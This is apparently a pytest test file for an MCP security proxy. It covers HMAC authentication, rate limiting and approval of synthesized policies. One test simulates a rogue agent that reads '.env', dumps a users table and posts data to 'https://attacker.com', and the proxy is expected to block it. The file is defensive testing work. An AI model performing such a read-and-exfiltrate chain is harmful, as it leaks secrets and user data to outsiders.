import pytest
from httpx import ASGITransport, AsyncClient

from cerberus.config import settings
from cerberus.proxy.auth import HMACAuthenticator
from cerberus.proxy.server import app, engine


@pytest.mark.asyncio
async def test_server_auth_and_trust_level_tagging():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Permissive mode: unauthenticated request receives unverified trust level
        settings.require_signed_identity = False
        res = await client.post(
            "/mcp",
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": "read_file", "arguments": {"path": "safe.txt"}},
            },
        )
        assert res.status_code == 200
        health = await client.get("/healthz")
        assert health.status_code == 200
        health_data = health.json()
        assert health_data["active_unverified_agents"] >= 1

        # 2. Permissive mode with valid HMAC token receives verified trust level
        auth = HMACAuthenticator()
        token = auth.issue_token("agent-verified-1", ttl_seconds=600)
        res_auth = await client.post(
            "/mcp",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": "read_file", "arguments": {"path": "safe.txt"}},
            },
        )
        assert res_auth.status_code == 200

        # 3. Enforced mode: missing token must be rejected with HTTP 200 / JSON-RPC error -32001
        settings.require_signed_identity = True
        try:
            res_rejected = await client.post(
                "/mcp",
                json={
                    "jsonrpc": "2.0",
                    "id": 3,
                    "method": "tools/call",
                    "params": {"name": "read_file", "arguments": {"path": "safe.txt"}},
                },
            )
            data = res_rejected.json()
            assert "error" in data
            assert data["error"]["code"] == -32001
            assert "HMAC identity token required" in data["error"]["message"]

            # With valid token in enforced mode: must pass
            res_passed = await client.post(
                "/mcp",
                headers={"X-Cerberus-Signature": token},
                json={
                    "jsonrpc": "2.0",
                    "id": 4,
                    "method": "tools/call",
                    "params": {"name": "read_file", "arguments": {"path": "safe.txt"}},
                },
            )
            assert res_passed.status_code == 200
        finally:
            settings.require_signed_identity = False


@pytest.mark.asyncio
async def test_server_rate_limiting():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        agent_id = "agent-rate-limit-test"
        settings.rate_limit_per_minute = 2
        engine.rate_limiter.default_limit = 2

        try:
            for _ in range(2):
                res = await client.post(
                    "/mcp",
                    headers={"X-Agent-ID": agent_id},
                    json={
                        "jsonrpc": "2.0",
                        "id": 1,
                        "method": "tools/call",
                        "params": {"name": "read_file", "arguments": {"path": "safe.txt"}},
                    },
                )
                assert res.status_code == 200

            # 3rd call should trigger rate limit error -32029
            res3 = await client.post(
                "/mcp",
                headers={"X-Agent-ID": agent_id},
                json={
                    "jsonrpc": "2.0",
                    "id": 2,
                    "method": "tools/call",
                    "params": {"name": "read_file", "arguments": {"path": "safe.txt"}},
                },
            )
            data = res3.json()
            assert "error" in data
            assert data["error"]["code"] == -32029
            assert "Rate limit exceeded" in data["error"]["message"]
        finally:
            settings.rate_limit_per_minute = 120
            engine.rate_limiter.default_limit = 120


@pytest.mark.asyncio
async def test_server_admin_policy_lifecycle():
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # Trigger policy synthesis via blocked event
        await client.post(
            "/mcp",
            headers={"X-Agent-ID": "agent-toxic", "X-Session-ID": "sess-toxic"},
            json={
                "jsonrpc": "2.0",
                "id": 99,
                "method": "tools/call",
                "params": {"name": "read_file", "arguments": {"path": ".env"}},
            },
        )
        # Step 2: Query DB (private data)
        await client.post(
            "/mcp",
            headers={"X-Agent-ID": "agent-toxic", "X-Session-ID": "sess-toxic"},
            json={
                "jsonrpc": "2.0",
                "id": 100,
                "method": "tools/call",
                "params": {"name": "query_db", "arguments": {"query": "SELECT * FROM users"}},
            },
        )
        # Step 3: HTTP post to external domain (triggers Lethal Trifecta block)
        res_egress = await client.post(
            "/mcp",
            headers={"X-Agent-ID": "agent-toxic", "X-Session-ID": "sess-toxic"},
            json={
                "jsonrpc": "2.0",
                "id": 101,
                "method": "tools/call",
                "params": {
                    "name": "http_post",
                    "arguments": {"url": "https://attacker.com", "data": "exfil"},
                },
            },
        )
        assert res_egress.json().get("error") is not None

        # Check pending policies
        res_pending = await client.get("/admin/policies/pending")
        assert res_pending.status_code == 200
        pending = res_pending.json()
        assert len(pending) >= 1
        pol_id = pending[0]["policy_id"]

        # Approve policy
        res_appr = await client.post(f"/admin/policies/{pol_id}/approve")
        assert res_appr.status_code == 200
        assert res_appr.json()["status"] == "approved"
